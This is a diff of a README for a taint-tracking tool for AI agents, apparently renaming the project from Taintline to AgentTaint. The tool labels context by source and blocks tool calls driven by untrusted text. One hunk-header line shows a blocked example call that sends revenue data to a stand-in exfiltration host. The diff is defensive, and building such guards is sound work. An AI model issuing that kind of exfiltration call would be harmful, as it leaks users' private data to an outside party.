@@ -1,6 +1,6 @@
 <div align="center">
 
-# Taintline
+# AgentTaint
 
 <h3>Taint tracking for AI agents</h3>
 
@@ -16,9 +16,9 @@
 
 ---
 
-## What is Taintline?
+## What is AgentTaint?
 
-Taint tracking for AI agents. `taintline` labels every piece of an agent's
+Taint tracking for AI agents. `agenttaint` labels every piece of an agent's
 context by where it came from (the user, the system prompt, a web page, an
 email, a tool output) and follows those labels into tool-call arguments. When
 untrusted text reaches a sensitive argument, such as a shell command, a URL or
@@ -48,7 +48,7 @@ the idea works for agents; there is no drop-in open-source version.
 1. **Label at ingress.** Every source that adds to the context gets a label:
    `trusted` (user, system), `untrusted` (web, email, files from outside),
    or a custom label per tenant or data class.
-2. **Propagate.** When a tool-call argument is produced, `taintline` works out
+2. **Propagate.** When a tool-call argument is produced, `agenttaint` works out
    which labelled spans it was derived from: exact and fuzzy matches for
    copied values, plus a planner/executor split (as in CaMeL) for values the
    model computes.
@@ -77,7 +77,7 @@ BLOCKED  http.fetch(url="https://exfil.example/?d=Q3%20revenue...")
 
 - Python and TypeScript libraries that wrap common agent frameworks
 - An MCP proxy mode for agents you can't modify
-- A sink policy file, shared with [IntentLock](https://github.com/sadayamuthu/intentlock)
+- A sink policy file, shared with [AgentLock](https://github.com/sadayamuthu/agentlock)
 - Flow logs in OpenTelemetry format, queryable with [anySQL](https://github.com/sadayamuthu/anysql)
 
 ---
@@ -116,13 +116,13 @@ The plan, from the first working version to 1.0, is in [ROADMAP.md](ROADMAP.md).
 
 ## Built on switchyard
 
-`taintline` will be a Go binary built on [switchyard](https://github.com/sadayamuthu/switchyard), OpenAstra's shared MCP proxy core: proxy mode is a switchyard hook that labels tool outputs as they pass and blocks calls whose arguments carry untrusted data. It stacks with the other switchyard tools by chaining (`agent → fuse → intentlock → taintline → rewind → MCP server`).
+`agenttaint` will be a Go binary built on [switchyard](https://github.com/sadayamuthu/switchyard), OpenAstra's shared MCP proxy core: proxy mode is a switchyard hook that labels tool outputs as they pass and blocks calls whose arguments carry untrusted data. It stacks with the other switchyard tools by chaining (`agent → agentfuse → agentlock → agenttaint → agentrewind → MCP server`).
 
 ---
 
 ## Related OpenAstra projects
 
-- [IntentLock](https://github.com/sadayamuthu/intentlock): limits *what* may be called; Taintline limits *what data* may drive it
+- [AgentLock](https://github.com/sadayamuthu/agentlock): limits *what* may be called; AgentTaint limits *what data* may drive it
 - [ThreatDiff](https://github.com/sadayamuthu/threatdiff): finds the source-to-sink paths statically
 - [anySQL](https://github.com/sadayamuthu/anysql): query the flow logs
 
@@ -136,7 +136,7 @@ Design feedback, real-world cases and fixes are welcome. See [CONTRIBUTING.md](C
 
 ## Security
 
-Please report vulnerabilities privately through [GitHub security advisories](https://github.com/sadayamuthu/taintline/security/advisories/new), not in a public issue. See [SECURITY.md](SECURITY.md) for what to include and what's in scope.
+Please report vulnerabilities privately through [GitHub security advisories](https://github.com/sadayamuthu/agenttaint/security/advisories/new), not in a public issue. See [SECURITY.md](SECURITY.md) for what to include and what's in scope.
 
 ---
 
@@ -148,10 +148,10 @@ Please report vulnerabilities privately through [GitHub security advisories](htt
 
 <div align="center">
 
-**Taintline: taint tracking for AI agents**
+**AgentTaint: taint tracking for AI agents**
 
-Taintline is managed by [OpenAstra](https://openastra.org)
+AgentTaint is managed by [OpenAstra](https://openastra.org)
 
-[GitHub](https://github.com/sadayamuthu/taintline) · [Thesis](THESIS.md) · [Roadmap](ROADMAP.md)
+[GitHub](https://github.com/sadayamuthu/agenttaint) · [Thesis](THESIS.md) · [Roadmap](ROADMAP.md)
 
 </div>
